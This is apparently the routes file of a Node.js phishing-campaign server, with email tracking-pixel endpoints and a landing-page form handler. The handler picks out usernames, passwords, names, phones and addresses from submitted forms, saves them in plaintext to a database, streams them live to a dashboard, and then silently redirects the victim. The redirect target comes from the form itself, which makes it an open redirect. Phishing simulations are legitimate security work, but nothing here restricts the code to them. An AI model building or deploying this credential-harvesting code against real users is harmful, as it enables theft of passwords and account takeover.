const express = require('express');
const router = express.Router();
const crypto = require('crypto');

/**
 * Tracking Routes
 * Handles all tracking pixel and campaign tracking endpoints
 */

let trackingService = null;
let io = null;

// Initialize services
const initServices = (tracking, socketIO) => {
  trackingService = tracking;
  io = socketIO;
};

// Direct tracking endpoint
router.get('/track', (req, res) => {
  console.log('🔍 Direct tracking pixel requested:', req.query.email);
  const pixelId = crypto.randomUUID();
  if (trackingService) {
    trackingService.logOpen(pixelId, req, res, io);
  } else {
    res.status(500).send('Tracking service not available');
  }
});

// Multiple tracking pixel endpoints for better compatibility
router.get('/tracker/:id.png', (req, res) => {
  console.log('🔍 PNG Tracking pixel requested:', req.params.id);
  if (trackingService) {
    trackingService.logOpen(req.params.id, req, res, io);
  } else {
    res.status(500).send('Tracking service not available');
  }
});

router.get('/track/:id/pixel.gif', (req, res) => {
  console.log('🔍 GIF Tracking pixel requested:', req.params.id);
  if (trackingService) {
    trackingService.logOpen(req.params.id, req, res, io);
  } else {
    res.status(500).send('Tracking service not available');
  }
});

router.get('/t/:id/p.png', (req, res) => {
  console.log('🔍 Alternative tracking pixel requested:', req.params.id);
  if (trackingService) {
    trackingService.logOpen(req.params.id, req, res, io);
  } else {
    res.status(500).send('Tracking service not available');
  }
});

// Test tracking pixel endpoint - for testing only
router.get('/test-tracker/:id', (req, res) => {
  const pixelId = req.params.id;
  console.log('📝 Test tracking endpoint called for pixel:', pixelId);
  // Redirect to the actual tracking pixel
  res.redirect(`/tracker/${pixelId}.png`);
});

// Form submission endpoint for landing pages
router.post('/submit-form/:campaignId/:landingPageId', async (req, res) => {
  const { campaignId, landingPageId } = req.params;
  const formData = req.body;
  
  console.log('📋 Form submission received:', {
    campaignId,
    landingPageId,
    data: formData
  });

  try {
    // Extract credentials (look for common field names)
    const credentials = {
      email: formData.email || formData.username || formData.user || formData.login || '',
      password: formData.password || formData.pass || formData.pwd || '',
      fullName: formData.name || formData.fullname || formData.full_name || '',
      phone: formData.phone || formData.telephone || formData.mobile || '',
      address: formData.address || '',
      ...formData // Include all other fields
    };

    // Remove hidden tracking fields from credentials
    delete credentials._originalAction;
    delete credentials._originalMethod;
    delete credentials._campaignId;
    delete credentials._landingPageId;

    // Store in database
    const db = require('../database');
    
    // First, insert into FormSubmissions table
    const submissionId = await new Promise((resolve, reject) => {
      db.run(
        `INSERT INTO FormSubmissions 
        (campaign_id, landing_page_id, form_data, ip_address, user_agent, created_at)
        VALUES (?, ?, ?, ?, ?, datetime('now'))`,
        [
          campaignId,
          landingPageId,
          JSON.stringify(credentials),
          req.ip || req.connection.remoteAddress,
          req.get('user-agent') || 'Unknown'
        ],
        function(err) {
          if (err) reject(err);
          else resolve(this.lastID);
        }
      );
    });

    console.log('✅ Form submission stored with ID:', submissionId);

    // Now insert individual fields into FormFields table
    const fieldPromises = Object.entries(credentials).map(([fieldName, fieldValue]) => {
      return new Promise((resolve, reject) => {
        // Determine field type
        let fieldType = 'text';
        if (fieldName.toLowerCase().includes('password')) fieldType = 'password';
        else if (fieldName.toLowerCase().includes('email')) fieldType = 'email';
        else if (fieldName.toLowerCase().includes('phone') || fieldName.toLowerCase().includes('tel')) fieldType = 'tel';
        
        db.run(
          `INSERT INTO FormFields 
          (submission_id, field_name, field_value, field_type, created_at)
          VALUES (?, ?, ?, ?, datetime('now'))`,
          [submissionId, fieldName, String(fieldValue), fieldType],
          function(err) {
            if (err) reject(err);
            else resolve(this.lastID);
          }
        );
      });
    });

    await Promise.all(fieldPromises);
    console.log('✅ All form fields stored');

    // Emit to Socket.IO for real-time dashboard updates
    if (io) {
      io.emit('formSubmission', {
        campaignId,
        landingPageId,
        submissionId,
        data: credentials,
        timestamp: new Date()
      });
      console.log('📡 Form submission broadcasted via Socket.IO');
    }

    // Redirect to success page or original action
    const redirectUrl = formData._originalAction || formData.redirect || '/';
    res.redirect(redirectUrl);

  } catch (error) {
    console.error('❌ Error storing form submission:', error);
    res.status(500).send('Submission error');
  }
});

module.exports = { router, initServices };
